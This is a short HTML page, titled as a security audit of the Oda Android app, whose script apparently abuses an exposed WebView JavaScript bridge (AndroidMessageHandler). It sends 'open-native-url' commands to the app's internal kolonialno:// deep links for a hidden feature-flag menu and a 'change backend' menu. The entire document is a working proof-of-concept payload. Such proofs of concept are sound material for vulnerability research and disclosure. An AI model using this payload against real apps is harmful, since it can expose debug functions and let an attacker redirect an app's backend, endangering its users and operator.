<html>
<body>
     <h1>Oda Security Audit</h1>
     <p>Triggering Debug Menu...</p>
     <script>
         setTimeout(function() {
             if (window.AndroidMessageHandler) {
                 // Mencoba membuka menu Feature Flag
                 AndroidMessageHandler.postMessage(JSON.stringify({
                     "command": "open-native-url",
                     "url": "kolonialno://android_native/feature_flag"
                 }));

                 // Backup: Mencoba membuka menu Change Backend
                 setTimeout(function() {
                     AndroidMessageHandler.postMessage(JSON.stringify({
                         "command": "open-native-url",
                         "url": "kolonialno://android_native/change_backend"
                     }));
                 }, 1000);
             }
         }, 1000);
     </script>
</body>
</html>
